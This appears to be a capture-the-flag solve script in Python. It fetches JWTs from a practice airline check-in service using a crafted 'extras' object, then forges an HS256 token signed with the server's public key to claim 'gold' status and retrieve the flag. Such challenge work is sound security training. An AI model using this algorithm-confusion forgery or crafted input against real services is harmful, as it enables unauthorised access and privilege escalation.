from pathlib import Path

import httpx
import jwt

base_url = "http://cybersec-ufscar.duckdns.org:3000"


def forge_token(key: str) -> str:
    return jwt.encode(
        {"status": "gold", "ffp": "CA12345669"}, key, algorithm="HS256"
    ).decode()


def get_flag(token: str) -> str:
    headers = {"Authorization": f"Bearer {token}"}
    response = httpx.post(
        f"{base_url}/upgrades/flag", headers=headers
    ).raise_for_status()
    flag = response.json()["msg"]
    return flag


def get_token(ffp: str) -> str:
    payload = {
        "firstName": "Any",
        "lastName": "Name",
        "passport": "123456789",
        "ffp": ffp,
        "extras": {"constructor": {"name": "Array"}, "a": {"sssr": "FQTU"}},
    }
    response = httpx.post(f"{base_url}/checkin", json=payload).raise_for_status()
    token = response.json()["token"]
    return token


def main():
    key_path = Path("public_key.pem")
    if not key_path.exists():
        print("Key not found, will retrieve JWT tokens")
        token1 = get_token("CA12345669")
        print(f"Got token1: {token1}")
        token2 = get_token("CA12345420")
        print(f"Got token2: {token2}")

        Path("jwt1").write_text(token1)
        Path("jwt2").write_text(token2)
        print("Written tokens to files")
    else:
        print("Key found, will forge JWT token")
        key = key_path.read_text()
        token = forge_token(key)
        print(f"Forged token: {token}")
        flag = get_flag(token)
        print(f"Flag: {flag}")


if __name__ == "__main__":
    main()
